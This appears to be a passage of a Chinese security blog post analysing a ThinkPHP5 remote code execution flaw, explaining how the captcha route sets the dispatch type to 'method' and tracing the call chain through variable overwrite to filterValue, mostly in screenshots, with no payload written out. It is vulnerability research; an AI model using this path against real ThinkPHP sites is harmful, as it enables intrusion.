+<p><img loading="lazy" src="https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202409141814775.webp" alt="image-20240914181441673" srcset="https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202409141814775.webp?size=small, https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202409141814775.webp?size=medium 1.5x, https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202409141814775.webp?size=large 2x" data-title="image-20240914181441673" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></p>
+<p><strong>ThinkPHP5</strong> 中支持 <strong>5种</strong> 路由地址方式定义：</p>
+<table>
+<thead>
+<tr>
+<th>定义方式</th>
+<th>定义格式</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>方式1：路由到模块/控制器</td>
+<td>&lsquo;[模块/控制器/操作]?额外参数1=值1&amp;额外参数2=值2&hellip;&rsquo;</td>
+</tr>
+<tr>
+<td>方式2：路由到重定向地址</td>
+<td>&lsquo;外部地址&rsquo;（默认301重定向） 或者 [&lsquo;外部地址&rsquo;,&lsquo;重定向代码&rsquo;]</td>
+</tr>
+<tr>
+<td>方式3：路由到控制器的方法</td>
+<td>&lsquo;@[模块/控制器/]操作&rsquo;</td>
+</tr>
+<tr>
+<td>方式4：路由到类的方法</td>
+<td>&lsquo;\完整的命名空间类::静态方法&rsquo; 或者 &lsquo;\完整的命名空间类@动态方法&rsquo;</td>
+</tr>
+<tr>
+<td>方式5：路由到闭包函数</td>
+<td>闭包函数定义（支持参数传入）</td>
+</tr>
+</tbody>
+</table>
+<p>而在 <strong>ThinkPHP5</strong> 完整版中，定义了验证码类的路由地址。程序在初始化时，会通过自动类加载机制，将 <strong>vendor</strong> 目录下的文件加载，这样在 <strong>GET</strong> 方式中便多了这一条路由。我们便可以利用这一路由地址，使得 <strong>$dispatch[&rsquo;type&rsquo;]</strong> 等于 <strong>method</strong> ，从而完成 <strong>远程代码执行</strong> 漏洞。</p>
+<h2 id="动态调试" class="heading-element"><span>动态调试</span>
+  <a href="#%e5%8a%a8%e6%80%81%e8%b0%83%e8%af%95" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h2><p>粗略的跟一下流程，不详细去跟每个参数的变化了</p>
+<p>断点打在method</p>
+<p><img loading="lazy" src="https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202409141846864.webp" alt="image-20240914184650690" srcset="https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202409141846864.webp?size=small, https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202409141846864.webp?size=medium 1.5x, https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202409141846864.webp?size=large 2x" data-title="image-20240914184650690" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></p>
+<p>往前看是怎么调用的</p>
+<p>APP 的run方法调用到<em>routeCheck</em></p>
+<p><img loading="lazy" src="https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202409141847637.webp" alt="image-20240914184718358" srcset="https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202409141847637.webp?size=small, https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202409141847637.webp?size=medium 1.5x, https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202409141847637.webp?size=large 2x" data-title="image-20240914184718358" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></p>
+<p>再调用到Route::<em>check</em></p>
+<p><img loading="lazy" src="https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202409141848183.webp" alt="image-20240914184802948" srcset="https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202409141848183.webp?size=small, https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202409141848183.webp?size=medium 1.5x, https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202409141848183.webp?size=large 2x" data-title="image-20240914184802948" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></p>
+<p>调用到method</p>
+<p><img loading="lazy" src="https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202409141848323.webp" alt="image-20240914184838058" srcset="https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202409141848323.webp?size=small, https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202409141848323.webp?size=medium 1.5x, https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202409141848323.webp?size=large 2x" data-title="image-20240914184838058" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></p>
+<p><img loading="lazy" src="https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202409141848296.webp" alt="image-20240914184850027" srcset="https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202409141848296.webp?size=small, https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202409141848296.webp?size=medium 1.5x, https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202409141848296.webp?size=large 2x" data-title="image-20240914184850027" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></p>
+<p>进入构造函数进行变量覆盖</p>
+<p><img loading="lazy" src="https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202409141849554.webp" alt="image-20240914184922280" srcset="https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202409141849554.webp?size=small, https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202409141849554.webp?size=medium 1.5x, https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202409141849554.webp?size=large 2x" data-title="image-20240914184922280" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></p>
+<p>回到APP，调用param</p>
+<p><img loading="lazy" src="https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202409141854576.webp" alt="image-20240914185405450" srcset="https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202409141854576.webp?size=small, https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202409141854576.webp?size=medium 1.5x, https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202409141854576.webp?size=large 2x" data-title="image-20240914185405450" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></p>
+<p>调用method（这是第二次了）</p>
+<p><img loading="lazy" src="https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202409141854061.webp" alt="image-20240914185440949" srcset="https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202409141854061.webp?size=small, https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202409141854061.webp?size=medium 1.5x, https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202409141854061.webp?size=large 2x" data-title="image-20240914185440949" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></p>
+<p>调用server</p>
+<p><img loading="lazy" src="https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202409141855765.webp" alt="image-20240914185505661" srcset="https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202409141855765.webp?size=small, https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202409141855765.webp?size=medium 1.5x, https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202409141855765.webp?size=large 2x" data-title="image-20240914185505661" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></p>
+<p>调用input</p>
+<p><img loading="lazy" src="https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202409141855019.webp" alt="image-20240914185522881" srcset="https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202409141855019.webp?size=small, https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202409141855019.webp?size=medium 1.5x, https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202409141855019.webp?size=large 2x" data-title="image-20240914185522881" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></p>
+<p>调用filterValue，基本就结束了</p>
+<p><img loading="lazy" src="https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202409141855469.webp" alt="image-20240914185543351" srcset="https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202409141855469.webp?size=small, https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202409141855469.webp?size=medium 1.5x, https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202409141855469.webp?size=large 2x" data-title="image-20240914185543351" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></p>
+<p><img loading="lazy" src="https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202409141856660.webp" alt="image-20240914185614446" srcset="https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202409141856660.webp?size=small, https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202409141856660.webp?size=medium 1.5x, https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202409141856660.webp?size=large 2x" data-title="image-20240914185614446" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></p></div><div class="post-footer" id="post-footer">
+  <div class="post-info">
+    <div class="post-info-line">
+      <div class="post-info-mod">
+        <span title="Updated on 2024-09-14 18:59:01">Updated on 2024-09-14&nbsp;</span>
+      </div></div><div class="post-info-line">
+        <div class="post-info-md"></div>
+        <div class="post-info-share">
+          <span></span>
+        </div>
+      </div></div>
+
+  <div class="post-info-more">
+    <section class="post-tags"><i class="fa-solid fa-tags fa-fw me-1" aria-hidden="true"></i><a href="/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" class="post-tag" title="Tags - 代码审计">代码审计</a><a href="/tags/php%E5%AE%89%E5%85%A8/" class="post-tag" title="Tags - Php安全">Php安全</a></section>
+    <section>
+      <span><a href="javascript:void(0);" onclick="window.history.back();">Back</a></span>&nbsp;|&nbsp;<span><a href="/">Home</a></span>
+    </section>
+  </div>
+
+  <div class="post-nav"><a href="/posts/%E5%AE%89%E5%85%A8%E7%A0%94%E7%A9%B6/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/php/%E5%AE%A1%E8%AE%A1/thinkphp5%E7%9A%84%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/" class="post-nav-item" rel="prev" title="ThinkPHP5的文件包含漏洞"><i class="fa-solid fa-angle-left fa-fw" aria-hidden="true"></i>ThinkPHP5的文件包含漏洞</a></div>
+</div>
+</article>
+
+  <aside class="toc" id="toc-auto" aria-label="Contents"><h2 class="toc-title">Contents&nbsp;<i class="toc-icon fa-solid fa-angle-down fa-fw" aria-hidden="true"></i></h2>
+      <div class="toc-content" id="toc-content-auto"></div></aside></main><footer class="footer">
+    <div class="footer-container"><div class="footer-line powered">Powered by <a href="https://gohugo.io/" target="_blank" rel="external nofollow noopener noreferrer" title="Hugo 0.132.1">Hugo</a> | Theme - <a href="https://github.com/hugo-fixit/FixIt" target="_blank" rel="external" title="FixIt v0.3.9">FixIt</a>
+        </div><div class="footer-line copyright" itemscope itemtype="http://schema.org/CreativeWork"><i class="fa-regular fa-copyright fa-fw" aria-hidden="true"></i>
+            <span itemprop="copyrightYear">2024</span><span class="author" itemprop="copyrightHolder">
+              <a href="/">东隅</a></span></div></div>
+  </footer></div><div class="widgets"><div class="fixed-buttons animate__faster d-none"><div class="fixed-button back-to-top" role="button" aria-label="Back to Top"><i class="fa-solid fa-arrow-up fa-fw" aria-hidden="true"></i><span class="variant-numeric">0%</span>
+        </div></div><div id="mask"></div><div class="reading-progress-bar" style="left: 0;top: 0;"></div><noscript>
+    <div class="noscript-warning">This website works best with JavaScript enabled.</div>
+  </noscript>
+</div><link rel="stylesheet" href="/lib/pace/themes/blue/pace-theme-minimal.css"><script src="/lib/instant-page/instantpage.min.js" async defer type="module"></script><script src="/lib/typeit/index.umd.js" defer></script><script src="/lib/pace/pace.min.js" async defer></script><script>window.config={"code":{"copyTitle":"Copy to clipboard","editLockTitle":"Lock editable code block","editUnLockTitle":"Unlock editable code block","editable":true,"maxShownLines":20},"comment":{"enable":false},"typeit":{"cursorChar":"_","cursorSpeed":1000,"duration":-1,"loop":false,"speed":100},"version":"v0.3.9"};</script><script src="/js/theme.min.js" defer></script><script>
+      window.dataLayer=window.dataLayer||[];function gtag(){dataLayer.push(arguments);}gtag('js', new Date());
+      gtag('config', 'G-YMSM8DYT3D', { 'anonymize_ip': true });
+    </script><script src="https://www.googletagmanager.com/gtag/js?id=G-YMSM8DYT3D" async></script></body>
+</html>
